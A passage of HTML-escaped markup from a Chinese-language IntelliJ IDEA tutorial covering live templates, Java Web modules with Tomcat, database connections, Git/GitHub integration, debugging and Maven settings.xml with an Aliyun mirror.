&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;h3livetemplates&quot;&gt;&lt;span&gt;&lt;strong&gt;3. 修改现有模板：Live Templates&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;如果对于现有的模板，感觉不习惯、不适应的，可以修改：&lt;br/&gt;修改 1：&lt;br/&gt;通过调用 psvm 调用 main 方法不习惯，可以改为跟 Eclipse 一样，使用 main 调取。&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWOAi.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;修改 2：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWbwy.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;类似的还可以修改 psfs。
&lt;h3 id=&quot;h4-3&quot;&gt;&lt;span&gt;&lt;strong&gt;4. 自定义模板&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;IDEA 提供了很多现成的 Templates。但你也可以根据自己的需要创建新的Template。&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWsGX.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;先定义一个模板的组：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWuEl.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;选中自定义的模板组，点击”+”来定义模板。&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jW47J.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;填写具体模板：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWZYB.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;1、Abbreviation：模板的缩略名称&lt;br/&gt;2、Description：模板的描述&lt;br/&gt;3、Template text：模板的代码片段&lt;br/&gt;4、应用范围。比如点击 Define。选择如下：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWhy6.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;可以如上的方式定义个测试方法，然后在 java 类文件中测试即可。&lt;br/&gt;类似的可以再配置如下的几个 Template:&lt;br/&gt;例如1：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWv8p.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;例如2：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWPH3.png&quot; alt=&quot;&quot;/&gt;&lt;h2 id=&quot;hjavawebprojectmodule&quot;&gt;&lt;span&gt;&lt;strong&gt;八、创建 Java Web Project 或 Module&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;h3 id=&quot;h1javaweb&quot;&gt;&lt;span&gt;&lt;strong&gt;1. 创建的静态 Java Web(前端开发)&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;某一个项目右键 -&amp;gt; New -&amp;gt; Module&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWauK.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;填写静态web的工程名称和位置：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWctG.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h2javaweb&quot;&gt;&lt;span&gt;&lt;strong&gt;2. 创建动态的 Java Web&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;h4 id=&quot;h21webmodule&quot;&gt;&lt;span&gt;&lt;strong&gt;2.1 创建动态 Web 的 Module(后端开发)&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;某一个项目右键 -&amp;gt; New -&amp;gt; Module&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWrwn.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;这里一定要勾选 Web Application，才能创建一个 Web 工程。&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWEGE.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;提供 Web 工程名和位置。&lt;br/&gt;创建以后的工程结构如下：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWLLQ.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;打开 index.jsp。修改为如下内容。这里你会发现 IDEA 的代码提示功能要强于 Eclipse。&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWe72.png&quot; alt=&quot;&quot;/&gt;&lt;h4 id=&quot;h22tomcat&quot;&gt;&lt;span&gt;&lt;strong&gt;2.2 配置本地 Tomcat&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;在 IDEA 中配置 Tomcat 之前，需要保证已经安装并配置了 Tomcat 的环境变量。&lt;br/&gt;如果没有安装并配置，可以参考《尚硅谷_宋红康_Tomcat快速部署.pdf》，配置完成以后，在命令行输入：catalina run。能够启动 tomcat，则证明安装配置成功。&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt;网上有些安装教程提到需要配置CATALINA_HOME环境变量，此变量指向了tomcat的目录，主要是为了方便tomcat运行使用，如果配置了，当你的电脑上有多个tomcat目录时只能成功运行那个和CATALINA_HOME一致的tomcat，如果不配置，在你启动tomcat时它会自己确定tomcat目录，这里我们就不配置了。&lt;code&gt;即推荐不进行tomcat的环境变量的配置&lt;/code&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;下面看如何在 IDEA 中配置：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jW1Pz.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;点击 Edit Configurations，对于2017版的IDEA，是再点击“+”按钮，再选择Tomcat Server -&amp;gt; Local，&lt;br/&gt;点击 Edit Configurations，对于2018版的IEDA，是再选择Templates -&amp;gt; Tomcat Server -&amp;gt; Local，编辑好模板后，再点击“+”按钮，再选择Tomcat Server -&amp;gt; Local。&lt;br/&gt;这里我们选择 TomEE Server 或者 Tomcat Server 都可以。&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWKYa.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;然后配置 Tomcat 的名称以及配置应用服务器的位置。根据自己 Tomcat 的安装位置决定。&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWA8S.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;其它位置使用默认值(设置要启动的浏览器以及端口号)，如下图所示。&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jW6Hh.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;接着点击部署【Deployment】-&amp;gt; 点击+ -&amp;gt; 【Artifact】：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWI4H.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;选择应用后&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWl3u.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;再点回【Server】选项卡，此时：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWNtN.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;这样我们的模板就配置好了，接下来，我们点击“+”按钮，再选择Tomcat Server -&amp;gt; Local，直接使用我们新建配置好的模板即可，如下图：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jW8M9.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;点击【OK】后，执行刚才创建的 index.jsp 即可：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWSLA.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;效果如下：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWxYq.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;注意事项：&lt;br/&gt;显示运行以后的 Tomcat 的信息：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jWfRO.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;可以点击红圈圈，刚点击后并不能马上关闭tomcat服务器，只是断开了与服务器的连接，稍后当停止按钮显示为灰色，才表示关闭。
&lt;h2 id=&quot;h-2&quot;&gt;&lt;span&gt;&lt;strong&gt;九、关联数据库&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;h3 id=&quot;h1-2&quot;&gt;&lt;span&gt;&lt;strong&gt;1. 关联方式&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jd45N.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;填写数据库相关信息，此时【Test Connection】为灰色状态&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jdJOu.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;填写完成后，点击【Download missing driver files】去中央仓库下载驱动文件，此时【Test Connection】为可点击状态，我们点击它进行数据库连接测试，测试成功如下：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jdZU9.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;点击【OK】后，查看效果：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jdsIH.png&quot; alt=&quot;&quot;/&gt;&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;&lt;code&gt;注意&lt;/code&gt;：表面上很多人认为配置 Database 就是为了有一个 GUI 管理数据库功能，但是这并不是 IntelliJ IDEA 的 Database 最重要特性。数据库的 GUI 工具有很多，IntelliJ IDEA 的 Database 也没有太明显的优势。IntelliJ IDEA 的 Database 最大特性就是对于 Java Web 项目来讲，常使用的 ORM 框架，如 Hibernate、Mybatis 有很好的支持，比如&lt;code&gt;配置好了 Database 之后，IntelliJ IDEA 会自动识别 domain 对象与数据表的关系，也可以通过 Database 的数据表直接生成 domain 对象&lt;/code&gt;等等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;h2-5&quot;&gt;&lt;span&gt;&lt;strong&gt;2. 常用操作&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jdhgA.png&quot; alt=&quot;&quot;/&gt;&lt;ul&gt;&lt;li&gt;&lt;span&gt;图标 1：同步当前的数据库连接。这个是最重要的操作。配置好连接以后或通过其他工具操作数据库以后，需要及时同步。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;图标 2：配置当前的连接。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;图标 3：断开当前的连接。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;图标 4：显示相应数据库对象的数据。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;图标 5：编辑修改当前数据库对象。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;hversioncontrol&quot;&gt;&lt;span&gt;&lt;strong&gt;十、版本控制(Version Control)&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;不管是个人开发还是团队开发，版本控制都会被使用。而 IDEA 也很好的集成了版本控制的相关结构。&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jdPaq.png&quot; alt=&quot;&quot;/&gt;&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;很多人认为 IntelliJ IDEA 自带了 SVN 或是 Git 等版本控制工具，认为只要安装了 IntelliJ IDEA 就可以完全使用版本控制应有的功能。这完全是一种错误的解读，IntelliJ IDEA是自带对这些版本控制工具的插件支持，但是该装什么版本控制客户端还是要照样装的。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;比如我们搜索插件git&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jdyQO.png&quot; alt=&quot;&quot;/&gt;&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;IntelliJ IDEA 对版本控制的支持是以插件化的方式来实现的。旗舰版默认支持目前主流的版本控制软件：CVS、Subversion（SVN）、Git、Mercurial、Perforce、TFS。又因为目前太多人使用 Github进行协同或是项目版本管理，所以 IntelliJ IDEA 同时自带了 Github 插件，方便 Checkout 和管理你的 Github 项目。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;实际开发中，发现在 IDEA 中使用 SVN 的经历不算愉快，经常会遇到很多问题，比如紧急情况下 IDEA 无法更新、提交等。所以这里，谈下在 IDEA中使用 Git。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;h3 id=&quot;h1git&quot;&gt;&lt;span&gt;&lt;strong&gt;1. 提前安装好 Git 的客户端&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;　　Git 的客户端 msysGit 官网下载：&lt;a href=&quot;https://git-scm.com/&quot; target=&quot;_blank&quot;&gt;https://git-scm.com/&lt;/a&gt;，安装教程链接：&lt;a href=&quot;https://www.cnblogs.com/chenmingjun/p/10160410.html&quot; target=&quot;_blank&quot;&gt;https://www.cnblogs.com/chenmingjun/p/10160410.html&lt;/a&gt;&lt;br/&gt;　　Git 的客户端 TortoiseGit 官网下载：&lt;a href=&quot;http://download.tortoisegit.org/tgit/&quot; target=&quot;_blank&quot;&gt;http://download.tortoisegit.org/tgit/&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;h2ideagitexe&quot;&gt;&lt;span&gt;&lt;strong&gt;2. IDEA 关联 git.exe&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jdafe.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h3github&quot;&gt;&lt;span&gt;&lt;strong&gt;3. 关联 GitHub 上的账户，并测试连接&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;点击【GitHub】-&amp;gt;【Add account】&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jdrXd.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;输入GitHub的用户名和密码&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jdUOi.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;连接成功后的截图：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jde9Y.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h4github&quot;&gt;&lt;span&gt;&lt;strong&gt;4. 在 GitHub 上创建账户下的一个新的仓库作为测试&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jdIiB.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;填写相关信息&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jd6cJ.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;创建远程仓库成功后的截图：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jdKUy.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h5ideagithubcheckout&quot;&gt;&lt;span&gt;&lt;strong&gt;5. IDEA 支持从当前登录的 Github 账号上直接 Checkout 项目&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jd1nX.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h6ideaclonegithub&quot;&gt;&lt;span&gt;&lt;strong&gt;6. 在 IDEA 中 clone GitHub 上的仓库&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;选择仓库地址：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jdtQl.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;点击【Clone】后，点击【Yes】
&lt;h3 id=&quot;h7github&quot;&gt;&lt;span&gt;&lt;strong&gt;7. 连接成功以后，会下载 github 上的项目&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jdkX6.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;填写项目名称和存储位置&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jdlZp.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;根据自己的需要，选择本窗口，还是开启一个新的窗口。&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jd8N3.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;Clone成功后截图：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jdRWQ.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h8github&quot;&gt;&lt;span&gt;&lt;strong&gt;8. 除此之外，还可以通过如下的方式连接 GitHub&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jdxUn.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h9ideagithub&quot;&gt;&lt;span&gt;&lt;strong&gt;9. IDEA 本地代码分享到 GitHub&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jd2nE.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;此时会在 GitHub 上创建一个新的仓库，而非更新已经存在的仓库。&lt;br/&gt;填写新的仓库的信息&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jdibG.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h10git&quot;&gt;&lt;span&gt;&lt;strong&gt;10. Git 的常用操作&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jdgc2.png&quot; alt=&quot;&quot;/&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;Clone：拷贝远程仓库&lt;br/&gt;Commit：本地提交&lt;br/&gt;Push：远程提交&lt;br/&gt;Pull：更新到本地&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;h11git&quot;&gt;&lt;span&gt;&lt;strong&gt;11. 没有使用 Git 时本地历史记录的查看&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jdnia.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;即使我们项目没有使用版本控制功能，IntelliJ IDEA 也给我们提供了本地文件历史记录。&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jdqmz.png&quot; alt=&quot;&quot;/&gt;&lt;h2 id=&quot;h-3&quot;&gt;&lt;span&gt;&lt;strong&gt;十一、断点调试&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;h3 id=&quot;h1debug&quot;&gt;&lt;span&gt;&lt;strong&gt;1. Debug 的设置&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jj9DH.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;设置 Debug 连接方式，默认是 Socket。Shared memory 是 Windows 特有的一个属性，一般在 Windows 系统下建议使用此设置，内存占用相对较少。
&lt;h3 id=&quot;h2-6&quot;&gt;&lt;span&gt;&lt;strong&gt;2. 常用断点调试快捷键&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jdwZS.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;对于常用的 Debug 的快捷键，需要大家熟练掌握。&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jj3Nh.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h3-4&quot;&gt;&lt;span&gt;&lt;strong&gt;3. 条件断点&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;说明：&lt;br/&gt;  调试的时候，在循环里增加条件判断，可以极大的提高效率，心情也能愉悦。&lt;br/&gt;具体操作：&lt;br/&gt;  在断点处右击跳出条件断点。可以在满足某个条件下，实施断点。&lt;br/&gt;查看表达式的值(Ctrl + u)：&lt;br/&gt;  选择行，Ctrl + u。还可以在查看框中输入编写代码时的其他方法：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jjDbN.png&quot; alt=&quot;&quot;/&gt;&lt;h2 id=&quot;hmaven&quot;&gt;&lt;span&gt;&lt;strong&gt;十二、配置 Maven&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;h3 id=&quot;h1maven&quot;&gt;&lt;span&gt;&lt;strong&gt;1. Maven 的介绍&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;Make -&amp;gt; Ant -&amp;gt; Maven -&amp;gt; Gradle&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;Maven 是 Apache 提供的一款自动化构建工具，用于自动化构建和依赖管理。开发团队基本不用花多少时间就能自动完成工程的基础构建配置，因为 Maven 使用了一个标准的目录结构和一个默认的构建生命周期。在如下环节中，Maven 使得开发者工作变得更简单。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;构建环节：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jjTWA.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;详解如下：
&lt;ul&gt;&lt;li&gt;&lt;span&gt;清理：表示在编译代码前将之前生成的内容删除&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;编译：将源代码编译为字节码&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;测试：运行单元测试用例程序&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;报告：测试程序的结果&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;打包：将 java 项目打成 jar 包；将 Web 项目打成 war 包&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;安装：将 jar 或 war 生成到 Maven 仓库中&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;部署：将 jar 或 war 从 Maven 仓库中部署到 Web 服务器上运行&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;h2maven&quot;&gt;&lt;span&gt;&lt;strong&gt;2. Maven 的配置&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;maven 的下载 – 解压 – 环境变量的配置这里就赘述了，需要的参考 1-课件中的《Maven 的配置》。下面直接整合 Maven。选择自己 Maven 的目录，和 settings 文件，然后配置自己的仓库 reposiroty。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;Maven 的核心程序并不包含具体功能，仅负责宏观调度。具体功能由插件来完成。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;Maven 核心程序会到本地仓库中查找插件。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;如果本地仓库中没有就会从远程中央仓库下载。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;此时如果不能上网则无法执行 Maven 的具体功能。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;为了解决这个问题，我们可以将 Maven 的本地仓库指向一个在联网情况下下载好的目录。&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jjBKu.png&quot; alt=&quot;&quot;/&gt;&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;Maven home directory：可以指定本地 Maven 的安装目录所在，因为我已经配置了 MAVEN_HOME 系统参数，所以直接这样配置 IntelliJ IDEA 是可以找到的。但是假如你没有配置的话，这里可以选择你的 Maven 安装目录。此外，这里不建议使用 IDEA 默认的。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;User settings file / Local repository：我们还可以指定 Maven 的 settings.xml 位置和本地仓库位置。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;settings.xml文件修改的地方：&lt;br/&gt;1、本地仓库地址&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jjFo9.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;2、远程仓库地址&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jjXrO.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;settings.xml文件修改的内容如下：
&lt;pre&gt;
&lt;code class=&quot;hljs xml&quot;&gt;......&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;localRepository&lt;/span&gt;&amp;gt;&lt;/span&gt;D:\learn\Maven\repository-idea&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;localRepository&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;......&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;mirror&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;id&lt;/span&gt;&amp;gt;&lt;/span&gt;alimaven&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;id&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;aliyun maven&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;url&lt;/span&gt;&amp;gt;&lt;/span&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;url&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;mirrorOf&lt;/span&gt;&amp;gt;&lt;/span&gt;central&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;mirrorOf&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;mirror&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;mirror&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;id&lt;/span&gt;&amp;gt;&lt;/span&gt;repo2&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;id&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;rep2 maven&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span 